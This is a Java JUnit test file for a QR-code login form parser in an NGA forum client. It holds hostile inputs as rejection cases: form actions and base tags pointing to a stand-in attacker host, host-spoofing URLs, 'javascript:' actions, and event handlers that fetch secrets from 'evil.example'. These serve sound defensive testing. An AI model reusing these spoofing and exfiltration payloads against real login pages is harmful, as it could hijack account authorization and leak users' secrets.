package com.bugenzhao.mnga.auth;

import org.jsoup.Jsoup;
import org.jsoup.nodes.Document;
import org.junit.Test;

import java.io.IOException;
import java.io.InputStream;
import java.nio.charset.StandardCharsets;
import java.util.Map;

import static org.junit.Assert.*;

/** No authenticated page has been observed: all accepted forms below are synthetic. */
public class NgaQrLoginFormTest {
    private static final String KEY = "SyntheticQrKey0123";
    private static final String UI = "https://bbs.nga.cn/nuke.php?__lib=login&__act=qrlogin_ui&qrkey=" + KEY;
    private static final String ACTION = "/nuke.php?__lib=login&__act=qrlogin_allow&raw=3";
    private static final String KEY_INPUT = "<input type='hidden' id='qrkey' name='qrkey' value=''>";
    private static final String SUBMIT = "<a id='loginsubmit' href='#' onclick='loginSubmit(this)'>Authorize desktop</a>";
    private static final NgaQrLoginTarget TARGET = NgaQrLoginTarget.parse(UI);

    @Test public void actualLoggedOutPageIsRejectedEvenThoughItsFormActionIsCorrect() throws IOException {
        Document page = Jsoup.parse(fixture("official-qrlogin-ui-logged-out.html"), UI);
        assertEquals(ACTION, page.selectFirst("form#loginform").attr("action"));
        assertTrue(page.text().contains("你没有在这台设备上登录"));
        assertTrue(page.select("input#qrkey, #loginsubmit").isEmpty());
        assertThrows(IllegalArgumentException.class, () -> NgaQrLoginForm.parse(page, TARGET));
    }

    @Test public void syntheticEmptyQrKeyIsFilledWithScannedKey() {
        Map<String, String> fields = parse(form(KEY_INPUT + SUBMIT)).fields;
        assertEquals(1, fields.size());
        assertEquals(KEY, fields.get("qrkey"));
    }

    @Test public void syntheticMissingValueAndExactQrKeyAreAccepted() {
        for (String input : new String[]{
                KEY_INPUT.replace(" value=''", ""),
                KEY_INPUT.replace("value=''", "value='" + KEY + "'")
        }) assertEquals(KEY, parse(form(input + SUBMIT)).fields.get("qrkey"));
    }

    @Test public void syntheticCsrfAndOtherHiddenFieldsArePreservedExactly() {
        NgaQrLoginForm result = parse(form(KEY_INPUT
                + "<input type='hidden' name='csrf_token' value='Synthetic+CSRF/Value==&amp;&quot;'>"
                + "<input type='hidden' name='nonce' value='  Keep Case And Spaces  '>"
                + "<input type='hidden' name='empty' value=''>" + SUBMIT));
        assertEquals(4, result.fields.size());
        assertEquals("Synthetic+CSRF/Value==&\"", result.fields.get("csrf_token"));
        assertEquals("  Keep Case And Spaces  ", result.fields.get("nonce"));
        assertEquals("", result.fields.get("empty"));
        assertThrows(UnsupportedOperationException.class, () -> result.fields.put("csrf_token", "changed"));
    }

    @Test public void syntheticUnderscorePrefixedCsrfFieldIsPreserved() {
        assertEquals("SyntheticToken", parse(form(KEY_INPUT + hidden("_csrf", "SyntheticToken") + SUBMIT)).fields.get("_csrf"));
    }

    @Test public void syntheticSameHostAbsoluteActionsAndQueryOrderingsAreAccepted() {
        for (String host : new String[]{"bbs.nga.cn", "ngabbs.com"}) {
            NgaQrLoginTarget target = NgaQrLoginTarget.parse(UI.replace("bbs.nga.cn", host));
            for (String action : new String[]{ACTION, "https://" + host + ACTION,
                    "/nuke.php?raw=3&__act=qrlogin_allow&__lib=login"}) {
                NgaQrLoginForm parsed = NgaQrLoginForm.parse(Jsoup.parse(
                        form(KEY_INPUT + SUBMIT).replace(ACTION, action), target.url), target);
                assertEquals(KEY, parsed.fields.get("qrkey"));
            }
        }
    }

    @Test public void syntheticCaseInsensitiveHtmlControlTypesAreAccepted() {
        String html = form(KEY_INPUT + SUBMIT).replace("method='post'", "method='POST'")
                .replace("type='hidden'", "type='HIDDEN'")
                .replace("method='POST'", "method='POST' enctype='APPLICATION/X-WWW-FORM-URLENCODED'");
        assertEquals(KEY, parse(html).fields.get("qrkey"));
    }

    @Test public void rejectsExternalAndSpoofedFormRoutes() {
        for (String action : new String[]{
                "https://evil.example" + ACTION, "https://bbs.nga.cn.evil.example" + ACTION,
                "https://bbs.nga.cn@evil.example" + ACTION, "https://evil.example@bbs.nga.cn" + ACTION,
                "https://ngabbs.com" + ACTION, "http://bbs.nga.cn" + ACTION,
                "https://bbs.nga.cn:443" + ACTION, "//bbs.nga.cn" + ACTION,
                "nuke.php?__lib=login&__act=qrlogin_allow&raw=3", "javascript:alert(1)",
                ACTION.replace("/nuke.php", "/%6euke.php"), ACTION.replace("/nuke.php", "/x/../nuke.php"),
                ACTION.replace("qrlogin_allow", "qrlogin_ui"), ACTION.replace("raw=3", "raw=2"),
                ACTION + "&extra=value", ACTION + "&qrkey=" + KEY, ACTION + "&raw=3",
                ACTION.replace("raw=3", "raw=%33"), ACTION + "#", ACTION + "#fragment", "", "/"
        }) reject(form(KEY_INPUT + SUBMIT).replace(ACTION, action));
    }

    @Test public void rejectsMissingMethodAndUnsupportedEncoding() {
        String valid = form(KEY_INPUT + SUBMIT);
        reject(valid.replace("method='post'", ""));
        for (String method : new String[]{"get", "put", "dialog", "post ", ""})
            reject(valid.replace("method='post'", "method='" + method + "'"));
        for (String encoding : new String[]{"multipart/form-data", "text/plain", "application/json", ""})
            reject(valid.replace("method='post'", "method='post' enctype='" + encoding + "'"));
    }

    @Test public void requiresOneUnambiguousFormAndOneOfEachMarker() {
        String valid = form(KEY_INPUT + SUBMIT);
        reject(valid.replace("id='loginform'", "id='other'"));
        reject(valid.replace("id='loginform'", ""));
        reject(valid + "<form></form>");
        reject(valid + "<div id='loginform'></div>");
        reject(valid + "<div id='qrkey'></div>");
        reject(valid + "<div id='loginsubmit'></div>");
        reject(form(KEY_INPUT + KEY_INPUT + SUBMIT));
        reject(form(KEY_INPUT + SUBMIT + SUBMIT));
        reject(form(SUBMIT));
        reject(form(KEY_INPUT));
    }

    @Test public void rejectsMarkerControlsOutsideTheAuthorizationForm() {
        reject(KEY_INPUT + form(SUBMIT));
        reject(form(KEY_INPUT) + SUBMIT);
        reject("<div id='loginform'></div>" + form(KEY_INPUT + SUBMIT).replace("id='loginform'", "id='other'"));
        reject(form("<div id='qrkey'></div>" + SUBMIT));
    }

    @Test public void unrelatedOutsideHiddenControlsAreNeverSubmitted() {
        NgaQrLoginForm parsed = parse("<input type='hidden' name='outside' value='NeverSubmitMe'>"
                + form(KEY_INPUT + SUBMIT));
        assertEquals(1, parsed.fields.size());
        assertFalse(parsed.fields.containsKey("outside"));
    }

    @Test public void rejectsMismatchedQrKeyNamesTypesAndValues() {
        for (String input : new String[]{
                KEY_INPUT.replace("name='qrkey'", "name='other'"),
                KEY_INPUT.replace("name='qrkey'", "name='QRKEY'"),
                KEY_INPUT.replace("name='qrkey'", ""),
                KEY_INPUT.replace("type='hidden'", "type='text'"),
                KEY_INPUT.replace("type='hidden'", ""),
                KEY_INPUT.replace("value=''", "value='DifferentSyntheticKey'"),
                KEY_INPUT.replace("value=''", "value='" + KEY.toLowerCase() + "'"),
                KEY_INPUT.replace("value=''", "value=' " + KEY + " '")
        }) reject(form(input + SUBMIT));
    }

    @Test public void rejectsDuplicateHiddenNamesIncludingDifferentQrKeyId() {
        reject(form(KEY_INPUT + "<input type='hidden' name='qrkey' value=''>" + SUBMIT));
        for (String value : new String[]{"same", "different", ""}) reject(form(KEY_INPUT
                + hidden("csrf_token", "same") + hidden("csrf_token", value) + SUBMIT));
    }

    @Test public void rejectsVisibleChallengesRatherThanGuessTheirAnswers() {
        for (String type : new String[]{"text", "password", "email", "number", "checkbox", "radio",
                "file", "tel", "url", "search", "date", "image", "range", "color", "reset", "unknown", ""}) {
            reject(form(KEY_INPUT + "<input type='" + type + "' name='challenge' value='x'>" + SUBMIT));
        }
        for (String control : new String[]{
                "<input name='captcha'>", "<textarea name='challenge'>value</textarea>",
                "<select name='challenge'><option>value</option></select>",
                "<div contenteditable='true'>challenge</div>", "<object data='challenge'></object>",
                "<fieldset disabled>" + hidden("csrf", "value") + "</fieldset>"
        }) reject(form(KEY_INPUT + control + SUBMIT));
    }

    @Test public void rejectsRequiredAndDisabledControls() {
        for (String attribute : new String[]{"required", "disabled"}) {
            reject(form(KEY_INPUT.replace("type='hidden'", "type='hidden' " + attribute) + SUBMIT));
            reject(form(KEY_INPUT + "<input type='hidden' name='csrf' " + attribute + " value='x'>" + SUBMIT));
            reject(form(KEY_INPUT + "<button type='submit' " + attribute + ">Submit</button>" + SUBMIT));
        }
        reject(form(KEY_INPUT + SUBMIT.replace("id='loginsubmit'", "id='loginsubmit' disabled")));
        reject(form(KEY_INPUT + SUBMIT.replace("id='loginsubmit'", "id='loginsubmit' hidden")));
    }

    @Test public void permitsUnnamedSubmitControlsButNeverDropsNamedButtonValues() {
        for (String control : new String[]{"<button type='submit'>Submit</button>",
                "<button>Submit</button>", "<input type='submit' value='Submit'>",
                "<input type='button' value='Cancel'>"}) {
            assertEquals(1, parse(form(KEY_INPUT + control + SUBMIT)).fields.size());
        }
        for (String control : new String[]{"<button name='confirm'>Submit</button>",
                "<button type='submit' name='confirm'>Submit</button>",
                "<input type='submit' name='confirm' value='yes'>",
                "<input type='button' name='confirm' value='yes'>"}) reject(form(KEY_INPUT + control + SUBMIT));
    }

    @Test public void rejectsFormControlAssociationAndSubmissionOverridesAnywhere() {
        for (String attribute : new String[]{"form='loginform'", "formaction='https://evil.example/'",
                "formmethod='get'", "formenctype='text/plain'"}) {
            reject(form(KEY_INPUT + "<button " + attribute + ">Submit</button>" + SUBMIT));
            reject(form(KEY_INPUT + SUBMIT) + "<input type='hidden' name='outside' " + attribute + ">");
            reject(form(KEY_INPUT + SUBMIT).replace("method='post'", "method='post' " + attribute));
        }
    }

    @Test public void rejectsBaseTemplateAndNoscriptContainers() {
        String valid = form(KEY_INPUT + SUBMIT);
        reject("<base href='https://evil.example/'>" + valid);
        reject("<base href='" + UI + "'>" + valid);
        reject("<template>" + valid + "</template>");
        reject(valid + "<template></template>");
        reject("<noscript>" + valid + "</noscript>");
        reject(valid + "<noscript>Please enable JavaScript</noscript>");
    }

    @Test public void commentAndScriptTextCannotSupplyMissingControls() {
        reject("<!--" + form(KEY_INPUT + SUBMIT) + "-->");
        reject("<script>var markup = \"" + form(KEY_INPUT + SUBMIT) + "\";</script>");
        reject(form("<!--" + KEY_INPUT + "-->" + SUBMIT));
        reject(form(KEY_INPUT + "<!--" + SUBMIT + "-->"));
        reject(form("<script>var markup = \"" + KEY_INPUT + "\";</script>" + SUBMIT));
        reject(form(KEY_INPUT + "<script>var markup = \"" + SUBMIT + "\";</script>"));
    }

    @Test public void rejectsNoninteractiveElementsMasqueradingAsConfirmationControls() {
        for (String marker : new String[]{
                "<script id='loginsubmit'>var confirmed = true;</script>",
                "<style id='loginsubmit'>body { color: black; }</style>",
                "<input id='loginsubmit' type='hidden' name='marker' value='yes'>",
                "<meta id='loginsubmit' content='yes'>"
        }) reject(form(KEY_INPUT + marker));
    }

    @Test public void rejectsHiddenFormsAndHiddenConfirmationAncestors() {
        String valid = form(KEY_INPUT + SUBMIT);
        for (String attribute : new String[]{"hidden", "inert", "style='display: none'", "style='visibility: hidden'"}) {
            reject(valid.replace("id='loginform'", "id='loginform' " + attribute));
            reject("<div " + attribute + ">" + valid + "</div>");
            reject(form(KEY_INPUT + "<div " + attribute + ">" + SUBMIT + "</div>"));
        }
    }

    @Test public void requiresExactKnownConfirmationHandler() {
        assertEquals(KEY, parse(form(KEY_INPUT + SUBMIT.replace("loginSubmit(this)", "loginSubmit(this);"))).fields.get("qrkey"));
        for (String handler : new String[]{"", "confirm()", "loginSubmit(this);evil()", "evil();loginSubmit(this)", "loginSubmit()"})
            reject(form(KEY_INPUT + SUBMIT.replace("loginSubmit(this)", handler)));
        reject(form(KEY_INPUT + SUBMIT.replace(" onclick='loginSubmit(this)'", "")));
    }

    @Test public void nonessentialEventsAreInertAndNeverBecomeFields() {
        Map<String, String> expected = parse(form(KEY_INPUT + hidden("_csrf", "SyntheticToken") + SUBMIT)).fields;
        for (String attribute : new String[]{"onsubmit='return false'", "onload='HandlerSecret'",
                "onfocus='fetch(&quot;https://evil.example/HandlerSecret&quot;)'", "onmouseover='arbitrary()'"}) {
            String valid = form(KEY_INPUT + hidden("_csrf", "SyntheticToken") + SUBMIT);
            assertEquals(expected, parse(valid.replace("method='post'", "method='post' " + attribute)).fields);
            assertEquals(expected, parse(valid.replace("type='hidden'", "type='hidden' " + attribute)).fields);
            assertEquals(expected, parse(valid.replace("id='loginsubmit'", "id='loginsubmit' " + attribute)).fields);
        }
        String inert = "<img src='https://evil.example/resource' onerror='HandlerSecret'>"
                + "<div onmouseover='fetch(&quot;https://evil.example/HandlerSecret&quot;)'>Ignored</div>";
        assertEquals(expected, parse(form(KEY_INPUT + hidden("_csrf", "SyntheticToken") + inert + SUBMIT)).fields);
    }

    @Test public void onlyEmptyKnownLoginframeIsSupported() {
        String valid = form(KEY_INPUT + SUBMIT).replace("method='post'", "method='post' target='loginframe'");
        String frame = "<iframe id='loginframe' name='loginframe' style='display:none'></iframe>";
        assertEquals(KEY, parse(valid + frame).fields.get("qrkey"));
        for (String target : new String[]{"_blank", "_self", "external", ""})
            reject(valid.replace("target='loginframe'", "target='" + target + "'"));
        reject(valid + frame + frame);
        reject(valid + frame.replace("id='loginframe'", "id='other'"));
        reject(valid + frame.replace("name='loginframe'", "name='other'"));
        for (String attribute : new String[]{"src=''", "src='https://evil.example/'", "srcdoc=''"})
            reject(valid + frame.replace("id='loginframe'", "id='loginframe' " + attribute));
    }

    @Test public void supportsOnlyExplicitUtf8AndOfficialChineseFormCharsets() {
        for (String charset : new String[]{"UTF-8", "GBK", "GB18030"}) {
            NgaQrLoginForm parsed = parse(form(KEY_INPUT + SUBMIT)
                    .replace("method='post'", "method='post' accept-charset='" + charset + "'"));
            assertEquals(charset, parsed.charset.name());
        }
        for (String charset : new String[]{"UTF-16", "ISO-8859-1", "US-ASCII", "not-a-charset", "", "UTF-8 GBK"})
            reject(form(KEY_INPUT + SUBMIT).replace("method='post'", "method='post' accept-charset='" + charset + "'"));
    }

    @Test public void rejectsReservedCredentialAndTransportFieldNamesCaseInsensitively() {
        for (String name : new String[]{"raw", "RAW", "__lib", "__LIB", "__act", "__ACT", "QRKEY", "QrKey", "access_uid", "Access_Token", "access_",
                "ngaPassportUid", "NGAPASSPORTCID", "ngapassport", "cookie", "COOKIE"}) {
            reject(form(KEY_INPUT + hidden(name, "SyntheticValue") + SUBMIT));
        }
    }

    @Test public void rejectsMissingInvalidAndOverlongFieldNames() {
        reject(form(KEY_INPUT + "<input type='hidden' value='missing-name'>" + SUBMIT));
        for (String name : new String[]{"", "9csrf", "csrf-token", "csrf.token", "csrf[]",
                "csrf token", "验证码", "a".repeat(65)}) reject(form(KEY_INPUT + hidden(name, "x") + SUBMIT));
        String maxName = "a".repeat(64);
        assertEquals("x", parse(form(KEY_INPUT + hidden(maxName, "x") + SUBMIT)).fields.get(maxName));
    }

    @Test public void boundsFieldValueLengthCountAndAggregateSize() {
        assertEquals(4096, parse(form(KEY_INPUT + hidden("csrf", "x".repeat(4096)) + SUBMIT)).fields.get("csrf").length());
        reject(form(KEY_INPUT + hidden("csrf", "x".repeat(4097)) + SUBMIT));
        StringBuilder count = new StringBuilder(KEY_INPUT);
        for (int i = 0; i < 31; i++) count.append(hidden("field" + i, "x"));
        assertEquals(32, parse(form(count + SUBMIT)).fields.size());
        reject(form(count + hidden("field32", "x") + SUBMIT));
        StringBuilder nearLimit = new StringBuilder(KEY_INPUT);
        StringBuilder overLimit = new StringBuilder(KEY_INPUT);
        for (int i = 0; i < 4; i++) {
            nearLimit.append(hidden("field" + i, "x".repeat(4000)));
            overLimit.append(hidden("field" + i, "x".repeat(4096)));
        }
        assertEquals(5, parse(form(nearLimit + SUBMIT)).fields.size());
        reject(form(overLimit + SUBMIT));
    }

    @Test public void rejectsNulValueEvenWhenDocumentIsAlreadyParsed() {
        Document page = Jsoup.parse(form(KEY_INPUT + hidden("csrf", "safe") + SUBMIT), UI);
        page.selectFirst("input[name=csrf]").attr("value", "before\0after");
        assertThrows(IllegalArgumentException.class, () -> NgaQrLoginForm.parse(page, TARGET));
    }

    @Test public void diagnosticsNeverEchoScannedKeysOrHiddenSecrets() {
        String secret = "SyntheticHiddenSecretValue";
        NgaQrLoginForm parsed = parse(form(KEY_INPUT + hidden("csrf", secret) + SUBMIT));
        assertFalse(parsed.toString().contains(KEY));
        assertFalse(parsed.toString().contains(secret));
        IllegalArgumentException error = assertThrows(IllegalArgumentException.class,
                () -> parse(form(KEY_INPUT.replace("value=''", "value='" + secret + "'") + SUBMIT)));
        assertFalse(error.toString().contains(secret));
        assertFalse(error.toString().contains(KEY));
        assertNull(error.getCause());
    }

    private static String form(String controls) {
        return "<form id='loginform' method='post' action='" + ACTION + "'>" + controls + "</form>";
    }

    private static String hidden(String name, String value) {
        return "<input type='hidden' name='" + name + "' value='" + value + "'>";
    }

    private static NgaQrLoginForm parse(String html) {
        return NgaQrLoginForm.parse(Jsoup.parse(html, UI), TARGET);
    }

    private static void reject(String html) {
        assertThrows("Unexpectedly accepted synthetic form: " + html, IllegalArgumentException.class, () -> parse(html));
    }

    private static String fixture(String name) throws IOException {
        try (InputStream input = NgaQrLoginFormTest.class.getResourceAsStream("/qr/" + name)) {
            assertNotNull("Missing test fixture: " + name, input);
            return new String(input.readAllBytes(), StandardCharsets.UTF_8);
        }
    }
}
